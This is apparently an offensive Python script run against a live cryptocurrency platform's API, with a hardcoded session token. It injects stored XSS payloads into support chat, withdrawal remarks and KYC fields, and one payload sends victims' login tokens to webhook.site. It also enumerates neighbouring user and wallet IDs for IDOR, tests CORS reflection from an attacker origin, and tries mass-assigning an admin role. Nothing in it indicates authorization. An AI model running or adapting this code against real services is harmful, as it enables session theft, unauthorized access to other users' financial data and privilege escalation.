"""
Riscoin - Stored XSS payload injection + IDOR + misc vector tests
"""
import requests, json
import urllib3
urllib3.disable_warnings()

BASE = "https://api.riscoima.com"
TOKEN = "c6apl6v4ok00_1jn74vunp"
H = {
    "Origin": "https://riscoin.com",
    "Referer": "https://riscoin.com/h5/",
    "Content-Type": "application/json",
    "SET-LANGUAGE": "ENGLISH",
    "APP-LOGIN-TOKEN": TOKEN,
    "User-Agent": "Mozilla/5.0"
}

print("=" * 70)
print("VECTOR B: Stored XSS Injection Attempts")
print("=" * 70)

xss_payload = '<img src=x onerror="fetch(\'https://webhook.site/test/\'+localStorage.getItem(\'APP-LOGIN-TOKEN\'))">'
xss_simple = '<script>alert(1)</script>'
xss_svg = '<svg onload="alert(1)">'

# Test 1: Chat support message
print("\n--- Chat: send XSS via support chat ---")
for msg in [xss_simple, xss_svg, xss_payload]:
    try:
        r = requests.post(f"{BASE}/api/app/chat/send", json={"content": msg, "type": "text"}, headers=H, timeout=10, verify=False)
        j = r.json()
        print(f"  [{r.status_code}] errCode={j.get('errCode','?')}: {r.text[:200]}")
    except Exception as e:
        print(f"  [ERR] {e}")

# Test 1b: Chat with different field names
print("\n--- Chat: alternate field names ---")
chat_combos = [
    {"message": xss_simple, "type": "text"},
    {"msg": xss_simple},
    {"text": xss_simple},
    {"content": xss_simple, "msgType": 1},
    {"content": xss_simple, "type": 1},
]
for payload in chat_combos:
    try:
        r = requests.post(f"{BASE}/api/app/chat/send", json=payload, headers=H, timeout=10, verify=False)
        j = r.json()
        err = j.get("errCode", "?")
        print(f"  errCode={err}: {list(payload.keys())}")
    except Exception as e:
        print(f"  [ERR] {e}")

# Test 2: Withdrawal remark
print("\n--- Withdrawal: submit with XSS in remark ---")
withdraw_payloads = [
    {"coinId": "USDT", "amount": "10", "address": "TRtest123", "remark": xss_simple, "chain": "TRC20"},
    {"coinId": "USDT", "amount": "10", "address": "TRtest123", "remark": xss_payload, "chain": "TRC20"},
]
for payload in withdraw_payloads:
    try:
        r = requests.post(f"{BASE}/api/app/withdraw/submit", json=payload, headers=H, timeout=10, verify=False)
        j = r.json()
        print(f"  [{r.status_code}] errCode={j.get('errCode','?')}: {r.text[:200]}")
    except Exception as e:
        print(f"  [ERR] {e}")

# Test 3: KYC fields
print("\n--- KYC: ordinary certification with XSS ---")
kyc_payload = {
    "firstName": xss_simple,
    "lastName": "<img src=x onerror=alert(1)>",
    "idNumber": "12345678",
    "country": "US",
    "type": 1,
}
try:
    r = requests.post(f"{BASE}/api/app/user/certification/ordinary", json=kyc_payload, headers=H, timeout=10, verify=False)
    j = r.json()
    print(f"  [{r.status_code}] errCode={j.get('errCode','?')}: {r.text[:200]}")
except Exception as e:
    print(f"  [ERR] {e}")

print("\n" + "=" * 70)
print("VECTOR F: IDOR User Enumeration")
print("=" * 70)

# Our user ID: 439441312266874880
# Our salesman ID: 223395751701209088
# Try to access other users' data
our_id = 439441312266874880

# Try nearby IDs
print("\n--- Testing nearby user IDs ---")
test_ids = [
    str(our_id - 1),
    str(our_id + 1),
    str(our_id - 100),
    str(our_id + 100),
    "223395751701209088",  # salesman
    "1",
    "0",
]

for uid in test_ids:
    # Try user share endpoint with user ID
    try:
        r = requests.post(f"{BASE}/api/app/user/share", json={"userId": uid}, headers=H, timeout=10, verify=False)
        j = r.json()
        err = j.get("errCode", "?")
        data_len = len(json.dumps(j.get("data", {})))
        if err == 0 and data_len > 10:
            print(f"  *** DATA FOUND for userId={uid}! ({data_len} bytes)")
            print(f"      {json.dumps(j['data'])[:300]}")
        else:
            print(f"  userId={uid}: errCode={err} ({data_len}b)")
    except Exception as e:
        print(f"  [ERR] userId={uid}: {e}")

# Try funds overview for other wallets
print("\n--- Testing wallet enumeration ---")
wallet_ids = [
    "439441312300429312",   # our wallet
    "439441312300429311",   # -1
    "439441312300429313",   # +1
]
for wid in wallet_ids:
    try:
        r = requests.post(f"{BASE}/api/app/funds/wallet/money", json={"walletId": wid}, headers=H, timeout=10, verify=False)
        j = r.json()
        err = j.get("errCode", "?")
        print(f"  walletId={wid}: errCode={err} | {r.text[:200]}")
    except Exception as e:
        print(f"  [ERR] walletId={wid}: {e}")

print("\n" + "=" * 70)
print("VECTOR E: CORS Verification")
print("=" * 70)

# Test CORS with evil origin
cors_headers = {
    "Origin": "https://evil-attacker.com",
    "Content-Type": "application/json",
    "SET-LANGUAGE": "ENGLISH",
}
try:
    r = requests.options(f"{BASE}/api/app/config", headers=cors_headers, timeout=10, verify=False)
    acao = r.headers.get("Access-Control-Allow-Origin", "NOT SET")
    acac = r.headers.get("Access-Control-Allow-Credentials", "NOT SET")
    print(f"  OPTIONS /api/app/config")
    print(f"    Access-Control-Allow-Origin: {acao}")
    print(f"    Access-Control-Allow-Credentials: {acac}")
    print(f"    All CORS headers: {dict((k,v) for k,v in r.headers.items() if 'access' in k.lower())}")
except Exception as e:
    print(f"  [ERR] {e}")

# Test with GET too
try:
    r = requests.post(f"{BASE}/api/app/config", json={}, headers={**cors_headers}, timeout=10, verify=False)
    acao = r.headers.get("Access-Control-Allow-Origin", "NOT SET")
    acac = r.headers.get("Access-Control-Allow-Credentials", "NOT SET")
    print(f"\n  POST /api/app/config (evil origin)")
    print(f"    Access-Control-Allow-Origin: {acao}")
    print(f"    Access-Control-Allow-Credentials: {acac}")
    if acao == "https://evil-attacker.com":
        print(f"    *** CORS REFLECTION CONFIRMED! Any origin is reflected! ***")
except Exception as e:
    print(f"  [ERR] {e}")

print("\n" + "=" * 70)
print("MASS ASSIGNMENT: Profile update attempts")
print("=" * 70)

# Try injecting admin fields via profile/password change
mass_assign_targets = [
    ("/api/app/user/change-password", {"oldPassword": "password111", "newPassword": "password111", "role": "admin", "isAdmin": True, "type": 1}),
]
for path, payload in mass_assign_targets:
    try:
        r = requests.post(f"{BASE}{path}", json=payload, headers=H, timeout=10, verify=False)
        print(f"  [{r.status_code}] {path}: {r.text[:200]}")
    except Exception as e:
        print(f"  [ERR] {path}: {e}")

# Check if our role changed
try:
    r = requests.post(f"{BASE}/api/app/user/get/info", json={}, headers=H, timeout=10, verify=False)
    j = r.json()
    data = j.get("data", {})
    print(f"\n  Current user role fields:")
    for key in ["role", "isAdmin", "type", "isSalesman", "agentId", "rankId", "teamRankId"]:
        print(f"    {key}: {data.get(key, 'N/A')}")
except Exception as e:
    print(f"  [ERR] {e}")

print("\nDone.")
